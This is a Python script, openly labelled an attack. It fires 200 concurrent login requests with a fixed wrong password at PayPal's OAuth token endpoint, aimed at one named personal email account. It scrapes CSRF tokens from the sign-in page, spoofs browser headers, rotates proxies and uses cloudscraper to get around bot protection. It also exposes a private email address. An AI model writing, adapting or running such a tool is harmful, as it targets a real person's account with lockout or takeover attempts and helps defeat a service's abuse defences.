import requests
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
import time
import random
import logging
import re

# Set up detailed logging to track requests, responses, and headers
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='paypal_endpoint_hits.log')

# Adjusted target endpoint based on PayPal's common OAuth flow (will attempt to confirm via frontend)
TARGET_URL = "https://api.paypal.com/v1/oauth2/token"
FRONTEND_URL = "https://www.paypal.com/signin"

# Number of threads/requests (adjusted for testing)
THREAD_COUNT = 50
TOTAL_REQUESTS = 200

# Fake user agent generator
fake = Faker()

# List of proxies (add your own for IP rotation if needed)
PROXIES = [
    # Example format: {"http": "http://proxy1:port", "https": "http://proxy1:port"},
]

# Input fields for PayPal email and password
PAYPAL_EMAIL = "ogorchukwuf@gmail.com"
PAYPAL_PASSWORD = "wrongpassword123"

# Hardcoded headers to mimic PayPal frontend browser request
def get_headers(referer="https://www.paypal.com/signin"):
    return {
        "User-Agent": fake.user_agent(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json; charset=UTF-8",
        "Referer": referer,
        "Origin": "https://www.paypal.com",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",
        "X-XHR-AJAX": "true",  # Often seen in PayPal AJAX calls
        "Connection": "keep-alive",
    }

# Hardcoded payload for login attempt (mimics OAuth2 password grant)
def get_payload(correlation_id=""):
    return {
        "username": PAYPAL_EMAIL,
        "password": PAYPAL_PASSWORD,
        "grant_type": "password",
        "nonce": str(random.randint(100000, 999999)),  # Add randomness as PayPal may expect unique values
        "correlationId": correlation_id if correlation_id else f"web_{int(time.time())}",  # Correlation ID if extracted
    }

# Function to extract session data (CSRF tokens, correlation IDs, etc.) from frontend response
def extract_session_data(session, url=FRONTEND_URL):
    try:
        # Simulate initial browser visit to signin page
        init_response = session.get(url, headers=get_headers(), timeout=10)
        cookies = dict(session.cookies)
        
        # Extract CSRF token from cookies or headers
        csrf_token = cookies.get("csrf", "") or cookies.get("X-CSRF-TOKEN", "")
        if not csrf_token:
            csrf_token = init_response.headers.get("X-CSRF-Token", "")
        
        # Extract correlation ID or other tokens from response body (HTML/JS)
        correlation_id = ""
        body_match = re.search(r'correlationId\s*[:=]\s*[\'"]?([^\'";]+)', init_response.text)
        if body_match:
            correlation_id = body_match.group(1)
        else:
            body_tokens = re.findall(r'(?:csrf|token|id)[^>]*value=[\'"]?([^\'" >]+)', init_response.text)
            correlation_id = body_tokens[0] if body_tokens else ""
        
        logging.info(f"Session Cookies: {cookies}")
        logging.info(f"Response Headers: {dict(init_response.headers)}")
        logging.info(f"Extracted CSRF Token: {csrf_token if csrf_token else 'Not found'}")
        logging.info(f"Extracted Correlation ID: {correlation_id if correlation_id else 'Generated'}")
        return {"csrf_token": csrf_token, "correlation_id": correlation_id, "cookies": cookies}
    except Exception as e:
        logging.error(f"Failed to extract session data: {str(e)}")
        return {}

# Function to send a single request using session data
def send_request(request_id, session, scraper, target_url, session_data):
    try:
        proxy = random.choice(PROXIES) if PROXIES else None
        headers = get_headers()
        payload = get_payload(session_data.get("correlation_id", ""))
        
        # Add extracted tokens to headers if available
        if session_data.get("csrf_token"):
            headers["X-CSRF-Token"] = session_data["csrf_token"]
        headers["X-Correlation-ID"] = payload["correlationId"]
        
        try:
            response = session.post(target_url, headers=headers, json=payload, proxies=proxy, timeout=5)
        except requests.exceptions.RequestException:
            response = scraper.post(target_url, headers=headers, json=payload, proxies=proxy, timeout=5)
        
        logging.info(f"Request {request_id} to {target_url} - Status Code: {response.status_code}")
        logging.info(f"Request {request_id} - Request Headers: {headers}")
        logging.info(f"Request {request_id} - Request Payload: {payload}")
        logging.info(f"Request {request_id} - Response Headers: {dict(response.headers)}")
        logging.info(f"Request {request_id} - Response Body: {response.text[:500]}...")
        print(f"Request {request_id} to {target_url} - Status: {response.status_code}")
        return response.status_code
    
    except requests.exceptions.RequestException as e:
        logging.error(f"Request {request_id} to {target_url} failed: {str(e)}")
        print(f"Request {request_id} failed: {str(e)}")
        return None

# Main function to handle concurrent requests
def hit_endpoint():
    request_counter = 0
    successful_requests = 0
    rate_limit_hits = 0
    
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    
    # Extract session data from frontend
    session_data = extract_session_data(session)
    
    # Try alternative endpoint if initial fails (fallback logic)
    target_url = TARGET_URL
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = []
        for i in range(TOTAL_REQUESTS):
            request_counter += 1
            futures.append(executor.submit(send_request, request_counter, session, scraper, target_url, session_data))
            time.sleep(random.uniform(0.1, 0.3))  # Slightly increased delay to avoid immediate blocks
        
        for future in futures:
            status_code = future.result()
            if status_code:
                successful_requests += 1
                if status_code == 429:
                    rate_limit_hits += 1
    
    logging.info(f"Total Requests: {request_counter}, Successful: {successful_requests}, Rate Limited: {rate_limit_hits}")
    print(f"Summary for {target_url} - Total: {request_counter}, Success: {successful_requests}, Rate Limited: {rate_limit_hits}")

if __name__ == "__main__":
    print(f"Starting attack on {TARGET_URL} with {TOTAL_REQUESTS} requests using {THREAD_COUNT} threads...")
    print(f"Targeting PayPal account: {PAYPAL_EMAIL}")
    hit_endpoint()
    print("Attack completed. Check 'paypal_endpoint_hits.log' for details.")
